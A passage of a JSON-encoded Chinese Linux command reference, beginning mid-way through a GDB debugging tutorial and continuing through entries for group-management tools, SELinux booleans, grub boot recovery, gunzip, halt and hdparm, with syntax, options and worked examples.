\u003c编号\u003e\u003c/td\u003e\n\n\u003ctd\u003edisplay，设置程序中断后欲显示的数据及其格式。  \n例如，如果希望每次程序中断后可以看到即将被执行的下一条汇编指令，可以使用命令  \n“display /i $pc”  \n其中 $pc 代表当前汇编指令，/i 表示以十六进行显示。当需要关心汇编代码时，此命令相当有用。 undispaly，取消先前的display设置，编号从1开始递增。\u003c/td\u003e\n\n\u003ctd\u003e(gdb) display /i $pc (gdb) undisplay 1\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ei\u003c/td\u003e\n\n\u003ctd\u003einfo的简写，用于显示各类信息，详情请查阅“help i”。\u003c/td\u003e\n\n\u003ctd\u003e(gdb) i r\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eq\u003c/td\u003e\n\n\u003ctd\u003eQuit的简写，退出GDB调试环境。\u003c/td\u003e\n\n\u003ctd\u003e(gdb) q\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ehelp [命令名称]\u003c/td\u003e\n\n\u003ctd\u003eGDB帮助命令，提供对GDB名种命令的解释说明。  \n如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。\u003c/td\u003e\n\n\u003ctd\u003e(gdb) help\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n### 语法  \n\n```\ngdb(选项)(参数)\n```\n\n### 选项  \n\n```\n-cd：设置工作目录；\n-q：安静模式，不打印介绍信息和版本信息；\n-d：添加文件查找路径；\n-x：从指定文件中执行GDB指令；\n-s：设置读取的符号表文件。\n```\n\n### 参数  \n\n文件：二进制可执行程序。\n\n### 实例  \n\n以下是linux下dgb调试的一个实例，先给出一个示例用的小程序，C语言代码：\n\n```\n#include \u003cstdio.h\u003e\nint nGlobalVar \u003d 0;\n\nint tempFunction(int a, int b)\n{\n    printf(\"tempFunction is called, a \u003d %d, b \u003d %d /n\", a, b);\n    return (a + b);\n}\n\nint main()\n{\n    int n;\n        n \u003d 1;\n        n++;\n        n--;\n\n        nGlobalVar +\u003d 100;\n        nGlobalVar -\u003d 12;\n\n    printf(\"n \u003d %d, nGlobalVar \u003d %d /n\", n, nGlobalVar);\n\n        n \u003d tempFunction(1, 2);\n    printf(\"n \u003d %d\", n);\n\n    return 0;\n}\n```\n\n请将此代码复制出来并保存到文件 gdb-sample.c 中，然后切换到此文件所在目录，用GCC编译之：\n\n```\ngcc gdb-sample.c -o gdb-sample -g\n```\n\n在上面的命令行中，使用 -o 参数指定了编译生成的可执行文件名为 gdb-sample，使用参数 -g 表示将源代码信息编译到可执行文件中。如果不使用参数 -g，会给后面的GDB调试造成不便。当然，如果我们没有程序的源代码，自然也无从使用 -g 参数，调试/跟踪时也只能是汇编代码级别的调试/跟踪。\n\n下面“gdb”命令启动GDB，将首先显示GDB说明，不管它：\n\n```\nGNU gdb Red Hat Linux (5.3post-0.20021129.18rh)\nCopyright 2003 free Software Foundation, Inc.\nGDB is free software, covered by the GNU General Public License, and you are\nwelcome to change it and/or distribute copies of it under certain conditions.\ntype \"show copying\" to see the conditions.\nThere is absolutely no warranty for GDB. Type \"show warranty\" for details.\nThis GDB was configured as \"i386-redhat-linux-gnu\".\n(gdb)\n```\n\n上面最后一行“(gdb)”为GDB内部命令引导符，等待用户输入GDB命令。\n\n下面使用“file”命令载入被调试程序 gdb-sample（这里的 gdb-sample 即前面 GCC 编译输出的可执行文件）：\n\n```\n(gdb) file gdb-sample\nReading symbols from gdb-sample...done.\n```\n\n上面最后一行提示已经加载成功。\n\n下面使用“r”命令执行（Run）被调试文件，因为尚未设置任何断点，将直接执行到程序结束：\n\n```\n(gdb) r\nStarting program: /home/liigo/temp/test_jmp/test_jmp/gdb-sample\nn \u003d 1, nGlobalVar \u003d 88\ntempFunction is called, a \u003d 1, b \u003d 2\nn \u003d 3\nProgram exited normally.\n```\n\n下面使用“b”命令在 main 函数开头设置一个断点（Breakpoint）：\n\n```\n(gdb) b main\nBreakpoint 1 at 0x804835c: file gdb-sample.c, line 19.\n```\n\n上面最后一行提示已经成功设置断点，并给出了该断点信息：在源文件 gdb-sample.c 第19行处设置断点；这是本程序的第一个断点（序号为1）；断点处的代码地址为 0x804835c（此值可能仅在本次调试过程中有效）。回过头去看源代码，第19行中的代码为“n \u003d 1”，恰好是 main 函数中的第一个可执行语句（前面的“int n;”为变量定义语句，并非可执行语句）。\n\n再次使用“r”命令执行（Run）被调试程序：\n\n```\n(gdb) r\nStarting program: /home/liigo/temp/gdb-sample\n\nBreakpoint 1, main () at gdb-sample.c:19\n19 n \u003d 1;\n```\n\n程序中断在gdb-sample.c第19行处，即main函数是第一个可执行语句处。\n\n上面最后一行信息为：下一条将要执行的源代码为“n \u003d 1;”，它是源代码文件gdb-sample.c中的第19行。\n\n下面使用“s”命令（Step）执行下一行代码（即第19行“n \u003d 1;”）：\n\n```\n(gdb) s\n20 n++;\n```\n\n上面的信息表示已经执行完“n \u003d 1;”，并显示下一条要执行的代码为第20行的“n++;”。\n\n既然已经执行了“n \u003d 1;”，即给变量 n 赋值为 1，那我们用“p”命令（Print）看一下变量 n 的值是不是 1 ：\n\n```\n(gdb) p n\n$1 \u003d 1\n```\n\n果然是 1。（$1大致是表示这是第一次使用“p”命令——再次执行“p n”将显示“$2 \u003d 1”——此信息应该没有什么用处。）\n\n下面我们分别在第26行、tempFunction 函数开头各设置一个断点（分别使用命令“b 26”“b tempFunction”）：\n\n```\n(gdb) b 26\nBreakpoint 2 at 0x804837b: file gdb-sample.c, line 26.\n(gdb) b tempFunction\nBreakpoint 3 at 0x804832e: file gdb-sample.c, line 12.\n```\n\n使用“c”命令继续（Continue）执行被调试程序，程序将中断在第二 个断点（26行），此时全局变量 nGlobalVar 的值应该是 88；再一次执行“c”命令，程序将中断于第三个断点（12行，tempFunction 函数开头处），此时tempFunction 函数的两个参数 a、b 的值应分别是 1 和 2：\n\n```\n(gdb) c\nContinuing.\n\nBreakpoint 2, main () at gdb-sample.c:26\n26 printf(\"n \u003d %d, nGlobalVar \u003d %d /n\", n, nGlobalVar);\n(gdb) p nGlobalVar\n$2 \u003d 88\n(gdb) c\nContinuing.\nn \u003d 1, nGlobalVar \u003d 88\n\nBreakpoint 3, tempFunction (a\u003d1, b\u003d2) at gdb-sample.c:12\n12 printf(\"tempFunction is called, a \u003d %d, b \u003d %d /n\", a, b);\n(gdb) p a\n$3 \u003d 1\n(gdb) p b\n$4 \u003d 2\n```\n\n上面反馈的信息一切都在我们预料之中~~\n\n再一次执行“c”命令（Continue），因为后面再也没有其它断点，程序将一直执行到结束：\n\n```\n(gdb) c\nContinuing.\ntempFunction is called, a \u003d 1, b \u003d 2\nn \u003d 3\nProgram exited normally.\n```\n\n有时候需要看到编译器生成的汇编代码，以进行汇编级的调试或跟踪，又该如何操作呢？\n\n这就要用到display命令“display /i $pc”了（此命令前面已有详细解释）：\n\n```\n(gdb) display /i $pc\n(gdb)\n```\n\n此后程序再中断时，就可以显示出汇编代码了：\n\n```\n(gdb) r\nStarting program: /home/liigo/temp/test_jmp/test_jmp/gdb-sample\n\nBreakpoint 1, main () at gdb-sample.c:19\n19 n \u003d 1;\n1: x/i $pc 0x804835c \u003cmain+16\u003e: movl $0x1,0xfffffffc(%ebp)\n```\n\n看到了汇编代码，“n \u003d 1;”对应的汇编代码是“movl $0x1,0xfffffffc(%ebp)”。\n\n并且以后程序每次中断都将显示下一条汇编指定（“si”命令用于执行一条汇编代码——区别于“s”执行一行C代码）：\n\n```\n(gdb) si\n20 n++;\n1: x/i $pc 0x8048363 \u003cmain+23\u003e: lea 0xfffffffc(%ebp),%eax\n(gdb) si\n0x08048366 20 n++;\n1: x/i $pc 0x8048366 \u003cmain+26\u003e: incl (%eax)\n(gdb) si\n21 n--;\n1: x/i $pc 0x8048368 \u003cmain+28\u003e: lea 0xfffffffc(%ebp),%eax\n(gdb) si\n0x0804836b 21 n--;\n1: x/i $pc 0x804836b \u003cmain+31\u003e: decl (%eax)\n(gdb) si\n23 nGlobalVar +\u003d 100;\n1: x/i $pc 0x804836d \u003cmain+33\u003e: addl $0x64,0x80494fc\n```\n\n接下来我们试一下命令“b *\u003c函数名称\u003e”。\n\n为了更简明，有必要先删除目前所有断点（使用“d”命令——Delete breakpoint）：\n\n```\n(gdb) d\nDelete all breakpoints? (y or n) y\n(gdb)\n```\n\n当被询问是否删除所有断点时，输入“y”并按回车键即可。\n\n下面使用命令“b *main”在 main 函数的 prolog 代码处设置断点（prolog、epilog，分别表示编译器在每个函数的开头和结尾自行插入的代码）：\n\n```\n(gdb) b *main\nBreakpoint 4 at 0x804834c: file gdb-sample.c, line 17.\n(gdb) r\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/liigo/temp/test_jmp/test_jmp/gdb-sample\n\nBreakpoint 4, main () at gdb-sample.c:17\n17 {\n1: x/i $pc 0x804834c \u003cmain\u003e: push %ebp\n(gdb) si\n0x0804834d 17 {\n1: x/i $pc 0x804834d \u003cmain+1\u003e: mov %esp,%ebp\n(gdb) si\n0x0804834f in main () at gdb-sample.c:17\n17 {\n1: x/i $pc 0x804834f \u003cmain+3\u003e: sub $0x8,%esp\n(gdb) si\n0x08048352 17 {\n1: x/i $pc 0x8048352 \u003cmain+6\u003e: and $0xfffffff0,%esp\n(gdb) si\n0x08048355 17 {\n1: x/i $pc 0x8048355 \u003cmain+9\u003e: mov $0x0,%eax\n(gdb) si\n0x0804835a 17 {\n1: x/i $pc 0x804835a \u003cmain+14\u003e: sub %eax,%esp\n(gdb) si\n19 n \u003d 1;\n1: x/i $pc 0x804835c \u003cmain+16\u003e: movl $0x1,0xfffffffc(%ebp)\n```\n\n此时可以使用“i r”命令显示寄存器中的当前值———“i r”即“Infomation Register”：\n\n```\n(gdb) i r\neax 0xbffff6a4 -1073744220\necx 0x42015554 1107383636\nedx 0x40016bc8 1073834952\nebx 0x42130a14 1108544020\nesp 0xbffff6a0 0xbffff6a0\nebp 0xbffff6a8 0xbffff6a8\nesi 0x40015360 1073828704\nedi 0x80483f0 134513648\neip 0x8048366 0x8048366\neflags 0x386 902\ncs 0x23 35\nss 0x2b 43\nds 0x2b 43\nes 0x2b 43\nfs 0x0 0\ngs 0x33 51\n```\n\n当然也可以显示任意一个指定的寄存器值：\n\n```\n(gdb) i r eax\neax 0xbffff6a4 -1073744220\n```\n\n最后一个要介绍的命令是“q”，退出（Quit）GDB调试环境：\n\n```\n(gdb) q\nThe program is running. exit anyway? (y or n)\n```\n\n\n"},{"name":"get_module","categoryId":0,"data":"get_module\n\u003d\u003d\u003d\n\n获取Linux内核模块的详细信息\n\n## 补充说明\n\n**get_module命令** 用于获取Linux内核模块的详细信息。\n\n### 语法  \n\n```\nget_module 模块名\n```\n\n### 实例  \n\n使用lsmod命令查看内核模块：\n\n```\nlsmod | head -5\nModule                  Size  Used by\nipv6                  272801  15\nxfrm_nalgo             13381  1 ipv6\ncrypto_api             12609  1 xfrm_nalgo\nip_conntrack_ftp       11569  0\n```\n\n使用get_module命令查看模块详细信息：\n\n```\nget_module ipv6\n        refcnt               : 15\n        srcversion           : 8CC9C024755B4483E56C0EF\n\nParameters:\n        autoconf             : 1\n        disable              : 0\n        disable_ipv6         : 0\nSections:\n        .altinstr_replacement : 0xf8f1a3cf\n        .altinstructions     : 0xf8f1d03c\n        .bss                 : 0xf8f36000\n        .data.read_mostly    : 0xf8f34d20\n        .data                : 0xf8f2f7a0\n        .exit.text           : 0xf8f1a234\n        .gnu.linkonce.this_module : 0xf8f34e00\n        .init.data           : 0xf8a16a60\n        .init.text           : 0xf8a16000\n        .module_sig          : 0xf8f37960\n        .rodata.str1.1       : 0xf8f1ae46\n        .rodata              : 0xf8f1a420\n        .smp_locks           : 0xf8f1d150\n        .strtab              : 0xf8f29840\n        .symtab              : 0xf8f24000\n        .text                : 0xf8ef5000\n        __kcrctab            : 0xf8f1de70\n        __kcrctab_gpl        : 0xf8f1d9cc\n        __ksymtab            : 0xf8f1dd78\n        __ksymtab_gpl        : 0xf8f1d954\n        __ksymtab_strings    : 0xf8f1da44\n        __param              : 0xf8f1da08\n        __versions           : 0xf8f1df00\n```\n\n\n"},{"name":"getsebool","categoryId":0,"data":"getsebool\n\u003d\u003d\u003d\n\n查询SElinux策略内各项规则的布尔值\n\n## 补充说明\n\n**getsebool命令** 是用来查询SElinux策略内各项规则的布尔值。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。\n\n### 语法  \n\n```\ngetsebool [-a] [布尔值条款]\n```\n\n### 选项  \n\n```\n-a：列出目前系统上面的所有布尔值条款设置为开启或关闭值。\n```\n\n### 实例  \n\n查询本系统内所有的布尔值设置状况：\n\n```\ngetsebool -a\nNetworkManager_disable_trans --\u003e off\nallow_console_login --\u003e off\nallow_cvs_read_shadow --\u003e off\nallow_daemons_dump_core --\u003e on\n....(底下省略)....\n```\n\n查询httpd_enable_homedirs是否为关闭，若没关闭，请关闭它：\n\n```\ngetsebool httpd_enable_homedirs\nsetsebool -P httpd_enable_homedirs\u003d0    //0是关闭  1是开启\n\n```\n\n\n"},{"name":"gpasswd","categoryId":0,"data":"gpasswd\n\u003d\u003d\u003d\n\nLinux下工作组文件的管理工具\n\n## 补充说明\n\n**gpasswd命令** 是Linux下工作组文件`/etc/group`和`/etc/gshadow`管理工具。\n\n### 语法  \n\n```\ngpasswd(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：添加用户到组；\n-d：从组删除用户；\n-A：指定管理员；\n-M：指定组成员和-A的用途差不多；\n-r：删除密码；\n-R：限制用户登入组，只有组中的成员才可以用newgrp加入该组。\n```\n\n### 参数  \n\n组：指定要管理的工作组。\n\n### 实例  \n\n如系统有个peter账户，该账户本身不是groupname群组的成员，使用newgrp需要输入密码即可。\n\n```\ngpasswd groupname\n```\n\n让使用者暂时加入成为该组成员，之后peter建立的文件group也会是groupname。所以该方式可以暂时让peter建立文件时使用其他的组，而不是peter本身所在的组。\n\n所以使用`gpasswd groupname`设定密码，就是让知道该群组密码的人可以暂时切换具备groupname群组功能的。\n\n```\ngpasswd -A peter users\n```\n\n这样peter就是users群组的管理员，就可以执行下面的操作:\n\n```\ngpasswd -a mary users\ngpasswd -a allen users\n```\n\n注意：添加用户到某一个组 可以使用`usermod -G group_name user_name`这个命令可以添加一个用户到指定的组，但是以前添加的组就会清空掉。\n\n所以想要添加一个用户到一个组，同时保留以前添加的组时，请使用gpasswd这个命令来添加操作用户：\n\n```\ngpasswd -a user_name group_name\n```\n\n\n"},{"name":"groupadd","categoryId":0,"data":"groupadd\n\u003d\u003d\u003d\n\n用于创建一个新的工作组\n\n## 补充说明\n\n**groupadd命令** 用于创建一个新的工作组，新工作组的信息将被添加到系统文件中。\n\n### 语法  \n\n```\ngroupadd(选项)(参数)\n```\n\n### 选项  \n\n```\n-g：指定新建工作组的id；\n-r：创建系统工作组，系统工作组的组ID小于500；\n-K：覆盖配置文件“/ect/login.defs”；\n-o：允许添加组ID号不唯一的工作组。\n```\n\n### 参数  \n\n组名：指定新建工作组的组名。\n\n### 实例  \n\n建立一个新组，并设置组ID加入系统：\n\n```\ngroupadd -g 344 jsdigname\n```\n\n此时在`/etc/passwd`文件中产生一个组ID（GID）是344的项目。\n\n\n"},{"name":"groupdel","categoryId":2,"data":"groupdel\n\u003d\u003d\u003d\n\n用于删除指定的工作组\n\n## 补充说明\n\n**groupdel命令** 用于删除指定的工作组，本命令要修改的系统文件包括/ect/group和/ect/gshadow。若该群组中仍包括某些用户，则必须先删除这些用户后，方能删除群组。\n\n### 语法  \n\n```\ngroupdel(参数)\n```\n\n### 参数  \n\n组：要删除的工作组名。\n\n### 实例  \n\n```\ngroupadd damon  //创建damon工作组\ngroupdel damon  //删除这个工作组\n```\n\n\n"},{"name":"groupmod","categoryId":2,"data":"groupmod\n\u003d\u003d\u003d\n\n更改群组识别码或名称\n\n## 补充说明\n\n**groupmod命令** 更改群组识别码或名称。需要更改群组的识别码或名称时，可用groupmod指令来完成这项工作。\n\n### 语法  \n\n```\ngroupmod(选项)(参数)\n```\n\n### 选项  \n\n```\n-g\u003c群组识别码\u003e：设置欲使用的群组识别码；\n-o：重复使用群组识别码；\n-n\u003c新群组名称\u003e：设置欲使用的群组名称。\n```\n\n### 参数  \n\n组名：指定要修改的工作的组名。\n\n\n"},{"name":"groups","categoryId":0,"data":"groups\n\u003d\u003d\u003d\n\n用来打印指定用户所属的工作组\n\n## 补充说明\n\n**groups命令** 在标准输入输出上输出指定用户所在组的组成员，每个用户属于`/etc/passwd`中指定的一个组和在`/etc/group`中指定的其他组。\n\n### 语法  \n\n```\ngroups(选项)(参数)\n```\n\n### 选项  \n\n```\n-help：显示命令的帮助信息；\n--version：显示命令的版本信息。\n```\n\n### 参数  \n\n用户名：指定要打印所属工作组的用户名。\n\n### 实例  \n\n显示linux用户所属的组\n\n```\ngroups linux\nlinux : linux adm dialout cdrom plugdev lpadmin admin sambashare\n```\n\n\n"},{"name":"grpck","categoryId":0,"data":"grpck\n\u003d\u003d\u003d\n\n用于验证组文件的完整性\n\n## 补充说明\n\n**grpck命令** 用于验证组文件的完整性，在验证之前，需要先锁定（lock）组文件`/etc/group`和`/etc/shadow`。\n\ngrpck命令检查数据是否正确存放，每条记录是否都包含足够的信息，是否有一个唯一的组名，是否包含正确的用户，是否正确设置了组的管理员等。grpck检查发现错误以后，在命令行提示用户是否删除错误的记录。如果用户没有明确回答删除记录，grpck终止运行。\n\n### 语法  \n\n```\ngrpck(选项)\n```\n\n### 选项  \n\n```\n-r：只读模式；\n-s：排序组id。\n```\n\n### 实例  \n\n对组账号和影子文件进行验证：\n\n```\ngrpck   //必须以管理员身份运行\ngrpck /etc/group /etc/gshadow   //后面两句一样，如果没有输出信息，则表示没有错误。\n```\n\n测试错误的实例：\n\n```\n**echo check_user:x: \u003e\u003e /etc/group    //添加一行错误的格式数据\ncat /etc/group | grep check_user**\ncheck_user:x:  //这儿GID字段为空，是错误的。\n\n **grpck /etc/group** \ninvalid group file entry\ndelete line \u0027check_user:x:\u0027? y      //提示是否删除\ngrpck: the files have been updated  //这时已经删除了错误的行，提示文件已经更新。\n\n **cat /etc/group  | grep check_user   //没有查到，已经删除了。** \n```\n\n\n"},{"name":"grpconv","categoryId":4,"data":"grpconv\n\u003d\u003d\u003d\n\n用来开启群组的投影密码\n\n## 补充说明\n\n**grpconv命令** 用来开启群组的投影密码。Linux系统里的用户和群组密码，分别存放在`/etc`目录下的passwd和group文件中。因系统运作所需，任何人都得以读取它们，造成安全上的破绽。投影密码将文件内的密码改存在`/etc`目录下的shadow和gshadow文件内，只允许系统管理者读取，同时把原密码置换为\"x\"字符。投影密码的功能可随时开启或关闭，您只需执行grpconv指令就能开启群组投影密码。\n\n### 语法  \n\n```\ngrpconv\n```\n\n### 实例  \n\n设置cdy组密码\n\n```\ngroupmod --password 123456 cdy\ncat /etc/group | grep cdy\ncdy:123456:1000:     //看出密码是123456\n```\n\n启动影子系统\n\n```\ngrpconv\ncat /etc/group |  grep cdy\ncdy:x:1000:      //看出密码段已经被x替代\n\ncat /etc/gshadow | grep cdy\ncdy:123456::      //已经移到影子文件了\n```\n\n注：gshadow, shadow只有root权限才可以查看。\n\n\n"},{"name":"grpunconv","categoryId":4,"data":"grpunconv\n\u003d\u003d\u003d\n\n用来关闭群组的投影密码\n\n## 补充说明\n\n**grpunconv命令** 用来关闭群组的投影密码。它会把密码从gshadow文件内，回存到group文件里。\n\n### 语法  \n\n```\ngrpunconv\n```\n\n### 实例  \n\n未关闭的情况\n\n```\ncat /etc/gshadow | grep cdy\ncdy:123456::\n```\n\n关闭影子密码\n\n```\ncat /etc/gshadow\ncat: /etc/gshadow: 没有那个文件或目录\n```\n\n查看密码已经复制到`/etc/group`中了。\n\n```\ncat /etc/group | grep cdy\ncdy:123456:1000:\n```\n\n\n"},{"name":"grub","categoryId":0,"data":"grub\n\u003d\u003d\u003d\n\n多重引导程序grub的命令行shell工具\n\n## 补充说明\n\n**grub命令** 是多重引导程序grub的命令行shell工具。\n\n### 语法  \n\n```\ngrub(选项)\n```\n\n### 选项  \n\n```\n--batch：打开批处理模式；\n--boot-drive\u003d\u003c驱动器\u003e：指定stage2的引导驱动器；\n--config-file\u003c配置文件\u003e：指定stage2的配置文件；\n--device-map\u003d\u003c文件\u003e：指定设备的映射文件；\n--help：显示帮助信息；\n--install-partition\u003d\u003c分区\u003e：指定stage2安装分区；\n--no-config-file：不使用配置文件；\n--no-pager：不使用内部分页器；\n--preset-menu：使用预设菜单；\n--probe-second-floppy：检测第二个软盘驱动器；\n--read-only：只读模式。\n```\n\n### 实例  \n\n利用grub命令来启动损坏的Linux系统，可能你的电脑因为某些原因损坏不能自动启动了。当然原因很多，可能的现象也很多。\n\n这里说一下这种情况下的处理方法，即：屏幕上提示`grub\u003e`，但你的硬盘上数据没有丢失，各分区都是好的。这种情况是你的grub信息损坏了，但比较严重的是系统启动不了。\n\n当然，在正常启动情况下，屏幕上出现grub的启动项选择菜单时按`c`键也是可以进入`grub\u003e`状态的。这时候我们需要用grub的命令来手工启动系统。\n\n只需要用到四个命令boot、kernel、initrd、boot。\n\n但grub本身命令很多，比如查看文件内容的cat ，你输入help会得到。\n\n首先，输入“ root (hd ” ，然后按两次 TAB 键； /* 这会列出你电脑上可能的磁盘设备，硬盘为 hd0/hd1 或 sd0/sd1 等 */\n\n然后，选择你的安装 Linux 系统的硬盘，比如 hd0 ，输入 “ root (hd0, ” 再按两次 TAB 键； /* 这会列出你的第一块硬盘上的分区情况，你会知道哪个是 swap 交换分区， 0x82 ，哪个是 Linux 分区 0x83 */\n\n选择你认为可能的 /boot 目录所在的分区， 输入`root (hd0, 1)`回车；\n\n接着，输入`cat /boot/vm`， 按两次 TAB 键，如果出现一些 vm 开头的文件，比如 vmlinuz-2.6.15-26-386 说明这里是 /boot 所在的分区。\n\n删除上一次的输入，再输入`cat /boot/initrd`，按两次 TAB 键，如果出现一些 initrd 开头的文件，比如 initrd.img-2.6.15-26-386 说明这个 /boot 所在的分区有 initrd ，即 ramdisk 镜像；\n\n删除上一次的输入，再输入`cat /sbin/init`，按两次 TAB 键，如果出现一些 init 开头的文件，比如`/sbin/init`说明这个分区是`/`所在的分区；\n\n如果没有出现`/sbin/init`文件，说明`(hd0,1)`分区仅仅是`/boot`分区而不是`/`分区。重新输入`root (hd0,N)`命令，这里 N 是某个 Linux 分区，然后再试`cat /sbin/init`， 直到屏幕上出现`/sbin/init`，说明你找到了`/`分区，严格来说，应该是`/sbin`目录所在的分区；\n\n依次输入命令：\n\n```\nroot (hd0,1)   /* 假设 /dev/hda2 是你的 /boot 所在的分区 */\nkernel /boot/vmlinuz-2.6.15-26-386 ro dev\u003d/dev/hda3    /* 假设 /dev/hda3 是你的 / 所在的分区 */\ninitrd /boot/initrd.img-2.6.15-26-386\nboot\n```\n\n即可启动系统。\n\n这里的关键问题是如何确定系统的几个分区：`/boot` `/` `/sbin`\n\n\n"},{"name":"gunzip","categoryId":10,"data":"gunzip\n\u003d\u003d\u003d\n\n用来解压缩文件\n\n## 补充说明\n\n**gunzip命令** 用来解压缩文件。gunzip是个使用广泛的解压缩程序，它用于解开被gzip压缩过的文件，这些压缩文件预设最后的扩展名为.gz。事实上gunzip就是gzip的硬连接，因此不论是压缩或解压缩，都可通过gzip指令单独完成。\n\n### 语法  \n\n```\ngunzip(选项)(参数)\n```\n\n### 选项  \n\n```\n-a或——ascii：使用ASCII文字模式；\n-c或--stdout或--to-stdout：把解压后的文件输出到标准输出设备；\n-f或-force：强行解开压缩文件，不理会文件名称或硬连接是否存在以及该文件是否为符号连接；\n-h或——help：在线帮助；\n-l或——list：列出压缩文件的相关信息；\n-L或——license：显示版本与版权信息；\n-n或--no-name：解压缩时，若压缩文件内含有原来的文件名称及时间戳记，则将其忽略不予处理；\n-N或——name：解压缩时，若压缩文件内含有原来的文件名称及时间戳记，则将其回存到解开的文件上；\n-q或——quiet：不显示警告信息；\n-r或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；\n-S或\u003c压缩字尾字符串\u003e或----suffix\u003c压缩字尾字符串\u003e：更改压缩字尾字符串；\n-t或——test：测试压缩文件是否正确无误；\n-v或——verbose：显示指令执行过程；\n-V或——version：显示版本信息；\n```\n\n### 参数  \n\n文件列表：指定要解压缩的压缩包。\n\n### 实例  \n\n首先将`/etc`目录下的所有文件以及子目录进行压缩，备份压缩包etc.zip到`/opt`目录，然后对etc.zip文件进行gzip压缩，设置gzip的压缩级别为9。\n\n```\nzip –r /opt/etc.zip /etc\ngzip -9v /opt/etc.zip\n```\n\n查看上述etc.zip.gz文件的压缩信息。\n\n```\ngzip -l /opt/etc.zip.gz\ncompressed        uncompressed ratio uncompressed_name\n11938745            12767265   6.5% /opt/etc.zip\n```\n\n解压上述etc.zip.gz文件到当前目录。\n\n```\n[root@mylinux ~]#gzip –d /opt/etc.zip.gz \n或者执行\n[root@mylinux ~]#gunzip /opt/etc.zip.gz\n```\n\n通过上面的示例可以知道`gzip –d`等价于`gunzip`命令。\n\n\n"},{"name":"halt","categoryId":2,"data":"halt\n\u003d\u003d\u003d\n\n关闭正在运行的Linux操作系统\n\n## 补充说明\n\n**halt命令** 用来关闭正在运行的Linux操作系统。halt命令会先检测系统的runlevel，若runlevel为0或6，则关闭系统，否则即调用shutdown来关闭系统。\n\n### 语法  \n\n```\nhalt(选项)\n```\n\n### 选项  \n\n```\n-d：不要在wtmp中记录；\n-f：不论目前的runlevel为何，不调用shutdown即强制关闭系统；\n-i：在halt之前，关闭全部的网络界面；\n-n：halt前，不用先执行sync；\n-p：halt之后，执行poweroff；\n-w：仅在wtmp中记录，而不实际结束系统。\n```\n\n### 实例  \n\n```\nhalt -p     //关闭系统后关闭电源。\nhalt -d     //关闭系统，但不留下纪录。\n```\n\n\n"},{"name":"hdparm","categoryId":3,"data":"hdparm\n\u003d\u003d\u003d\n\n显示与设定硬盘的参数\n\n## 补充说明\n\n**hdparm命令** 提供了一个命令行的接口用于读取和设置IDE或SCSI硬盘参数。\n\n### 语法  \n\n```\nhdparm(选项)(参数)\n```\n\n### 选项  \n\n```\n-a\u003c快取分区\u003e：设定读取文件时，预先存入块区的分区数，若不加上\u003c快取分区\u003e选项，则显示目前的设定；\n-A\u003c0或1\u003e：启动或关闭读取文件时的快取功能；\n-c\u003cI/O模式\u003e：设定IDE32位I/O模式；\n-C：检测IDE硬盘的电源管理模式；\n-d\u003c0或1\u003e：设定磁盘的DMA模式；\n-f：将内存缓冲区的数据写入硬盘，并清楚缓冲区；\n-g：显示硬盘的磁轨，磁头，磁区等参数；\n-h：显示帮助；\n-i：显示硬盘的硬件规格信息，这些信息是在开机时由硬盘本身所提供；\n-I：直接读取硬盘所提供的硬件规格信息；\n-k\u003c0或1\u003e：重设硬盘时，保留-dmu参数的设定；\n-K\u003c0或1\u003e：重设硬盘时，保留-APSWXZ参数的设定；\n-m\u003c磁区数\u003e：设定硬盘多重分区存取的分区数；\n-n\u003c0或1\u003e：忽略硬盘写入时所发生的错误；\n-p\u003cPIO模式\u003e：设定硬盘的PIO模式；\n-P\u003c磁区数\u003e：设定硬盘内部快取的分区数；\n-q:在执行后续的参数时，不在屏幕上显示任何信息；\n-r\u003c0或1\u003e:设定硬盘的读写模式；\n-S\u003c时间\u003e:设定硬盘进入省电模式前的等待时间；\n-t;评估硬盘的读取效率；\n-T：平谷硬盘快取的读取效率；\n-u\u003c0或1\u003e：在硬盘存取时，允许其他中断要求同时执行；\n-v：显示硬盘的相关设定；\n-w\u003c0或1\u003e：设定硬盘的写入快取；\n-X\u003c传输模式\u003e：设定硬盘的传输模式；\n-y：使IDE硬盘进入省电模式；\n-Y：使IDE硬盘进入睡眠模式；\n-Z：关闭某些Seagate硬盘的自动省电功能。\n```\n\n### 参数  \n\n设备文件：指定id驱动对应的设备文件名。\n\n### 实例  \n\n显示硬盘的相关设置：\n\n```\nhdparm /dev/sda\n/dev/sda:\nIO_support \u003d 0 (default 16-bit)\nreadonly \u003d 0 (off)\nreadahead \u003d 256 (on)\ngeometry \u003d 19457［柱面数］/255［磁头数］/63［扇区数］, sectors \u003d 312581808［总扇区数］, start \u003d 0［起始扇区数］\n\n```\n\n显示硬盘的柱面、磁头、扇区数：\n\n```\nhdparm -g /dev/sda\n/dev/sda:\ngeometry \u003d 19457［柱面数］/255［磁头数］/63［扇区数］, sectors \u003d 312581808［总扇区数］, start \u003d 0［起始扇区数］\n```\n\n测试硬盘的读取速度：\n\n```\nhdparm -T /dev/sda\n/dev/sda:\n Timing cached reads:   4684 MB in  2.00 seconds \u003d 2342.92 MB/sec\n```\n\n测试硬盘缓存的读取速度：\n\n```\nhdparm -T /dev/xvda\n/dev/xvda:\nTiming cached reads: 11154 MB in 1.98 seconds \u003d 5633.44 MB/sec\n\n```\n\n检测硬盘的电源管理模式：\n\n```\nhdparm -C /dev/sda\n/dev/sda:\ndrive state is: standby [省电模式]\n```\n\n查询并设置硬盘多重扇区存取的扇区数，以增进硬盘的存取效率：\n\n```\nhdparm -m /dev/sda\nhdparm -m    #参数值为整数值如8 /dev/sda\n```\n\n **附：硬盘坏道修复方法** \n\n```\n检查：smartctl -l selftest /dev/sda\n卸载：umount /dev/sda*\n修复：badblocks /dev/sda\n```\n\n\n"},{"name":"head","categoryId":0,"data":"head\n\u003d\u003d\u003d\n\n在屏幕上显示指定文件的开头若干行\n\n## 补充说明\n\n**head命令** 用于显示文件的开头的内容。在默认情况下，head命令显示文件的头10行内容。\n\n### 